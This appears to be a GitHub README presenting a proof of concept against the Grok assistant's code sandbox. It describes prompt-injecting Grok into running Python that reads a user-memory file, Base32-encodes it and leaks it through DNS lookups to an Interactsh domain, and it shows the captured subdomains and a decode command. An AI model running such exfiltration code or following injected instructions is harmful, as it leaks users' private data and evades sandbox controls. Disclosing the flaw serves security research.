# grokdnsexfiltration
Don't use! Grok Ai



I created some python codes for prompt injection, because grok is running the python code. 

Because I have source code for this. : https://github.com/berkayeacar00-commits/grksrvrmjs.git

## Proof of Concept (PoC)
1) I generated a unique OAST (Interactsh) domain to capture incoming infrastructure logs: bwagflfxdadrowyvoodh0osbrq6pu96gq.oast.fun
2) I executed a Python script inside the environment that reads list and the first 100 characters of a system file (/home/workdir/.grok/user_info/memory.md), converts the text into standard Base32 format, and chunks the payload into 30-character segments.
3) The environment successfully resolved these chunked subdomains over UDP 53 without triggering any network block or rate-limiting.
And then I checked to base32 code, it was true.

*IF YOU WANT TO TEST ON INTERACTSH : you find to this link in code and replace your domain: bwagflfxdadrowyvoodh0osbrq6pu96gq.oast.fun*

Results:
file-0-emqfk43foiqe2zlnn5zhscqkemrsav.bwagflfxdadrowyvoodh0osbrq6pu96gq.oast.fun

file-1-3in4qfi2djomqfk43foiqes4ykfuqc.bwagflfxdadrowyvoodh0osbrq6pu96gq.oast.fun

file-2-uksomfwwkorkfiqeezlsnnqxsic3gi.bwagflfxdadrowyvoodh0osbrq6pu96gq.oast.fun

on my interactsh panel.

### CONVERT BASE32 TO TXT
echo "emqfk43foiqe2zlnn5zhscqkemrsav3in4qfi2djomqfk43foiqes4ykfuqcuksomfwwkorkfiqeezlsnnqxsic3gi" | tr '[:lower:]' '[:upper:]' | base32 -d

##### User Memory
 
###### Who This User Is
- **Name:** Berkay [2026-06-03]
- **Education:** Civil engineering ....
- ....... it's my usermemory.md files!


See the full code: prompt.py
